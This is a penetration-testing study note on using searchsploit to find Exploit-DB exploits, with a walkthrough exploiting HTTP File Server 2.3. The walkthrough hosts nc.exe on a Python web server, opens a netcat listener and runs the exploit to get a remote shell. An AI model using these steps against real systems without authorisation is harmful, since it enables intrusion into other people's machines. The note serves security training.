
# Searchsploit

**Searchsploit** is part of the Exploit-DB toolkit.  
It lets us quickly search, copy, and use publicly available exploits from the terminal.  
This is super useful during penetration testing when looking for exploits for discovered services or software versions.

---

## Basic Usage
```bash
# Search for exploits related to vsftpd 2.3.4
searchsploit vsftpd 2.3.4

# Update the Searchsploit database
searchsploit -u

# Copy exploit code locally (here exploit ID is 49757)
searchsploit -m 49757
```

## Case Sensitivity

* Searchsploit is **case-sensitive** when using `-c`.
* Example:

  ```bash
  searchsploit -c OpenSSH   # Works
  searchsploit -c openssh   # May fail
  ```

---

## Title-Based Search

```bash
searchsploit -t vsftpd
searchsploit -t bufferoverflow
```

---

## Exact Match in Title

```bash
searchsploit -e "Windows XP"        # Exact match in title
searchsploit --exact "windows exp"  # Alternate syntax
```

You can also combine with `grep`:

```bash
searchsploit -e "Windows XP" | grep -e "microsoft windows"
```

---

## Multi-Keyword Search

```bash
# General exploit searches
searchsploit remote windows smb
searchsploit remote windows buffer

# Web application exploits
searchsploit remote webapps wordpress
searchsploit remote webapps drupal
```

---

## Privilege Escalation

```bash
# Search for local privilege escalation exploits in Windows
searchsploit local windows | grep -e "microsoft"
```

---

## Extra Options

```bash
# Get Exploit-DB online link instead of local path
searchsploit remote windows smb -w | grep -e "Eternal Blue"

# Copy exploit path to working directory
sudo cp /usr/share/exploitdb/exploits/windows/remote/xxxx.py .
```

---

### Practical Takeaways (My Notes)

* Use `searchsploit -u` regularly to keep exploit database updated.
* `-m` is extremely handy to quickly bring an exploit into your working folder.
* `-t` and `-e` help refine searches when results are too broad.
* Combining Searchsploit with `grep` gives much more control.
* Exploits are not plug-and-play → **always read exploit code** to adjust target IP/port/version.
* Works offline (local database), unlike online exploit searches.




#
#
#


# Fixing & Using Exploits from Searchsploit

Sometimes exploits from Searchsploit don’t work "out-of-the-box".  
We need to carefully **read the exploit code and EDB notes**, fix issues, and prepare the environment to use them effectively.  

---

## Practical Walkthrough: Exploiting HFS (HTTP File Server 2.3)
1. **Identify the web server with Nmap**
   ```bash
   nmap -sV <target-ip>


2. **Search for an exploit**

   ```bash
   searchsploit "HTTP File Server 2.3"
   searchsploit -m 39161     # Copies exploit locally
   ```

3. **Read the exploit code & notes**

   * Exploit file will contain **usage instructions**.
   * Example:

     ```bash
     python exploit.py <target-ip> <port>
     ```
   * If nothing happens, check the **EDB Notes** → sometimes you need extra setup.

---

## Hosting Payload with Netcat Executable

* Some exploits require the target to download a binary (e.g., netcat) from our machine.

Steps:

```bash
# Copy Windows netcat binary to working directory
cp /usr/share/windows-resources/binaries/nc.exe .

# Start a Python HTTP server (to host nc.exe)
python -m SimpleHTTPServer 80
```

---

## Setting up Listener

```bash
# Open a new terminal for listener
nc -nvlp 1234
```

*(Port number must match what is specified inside the exploit script)*

---

## Running the Exploit

```bash
python exploitfile.py <target-ip> <port>
```

* Run again if needed to get a **remote shell (cmd session)**.
* Example command once inside:

```bash
sysinfo
```

---

## Important Notes

* Some exploits are in **C**, so they cannot run directly.

  * Need to **compile first** into a binary:

    ```bash
    gcc exploit.c -o exploit
    ./exploit <args>
    ```
* Always check exploit **requirements**:

  * Listener port
  * Payload hosting (HTTP/FTP server)
  * Target-specific versions

---

## Practical Takeaways (My Notes)

* Don’t blindly run exploits – **read comments inside the script**.
* Many require setting up a payload (like `nc.exe`) hosted on our server.
* Always check **EDB Notes** for extra requirements.
* Learned how to manually set up **Python web server** + **netcat listener** for exploit execution.
* Real-world pentests often need **fixing/modifying exploit code**, not just copy-paste.
* Some exploits need **compilation** before use (C/C++ based ones).

---
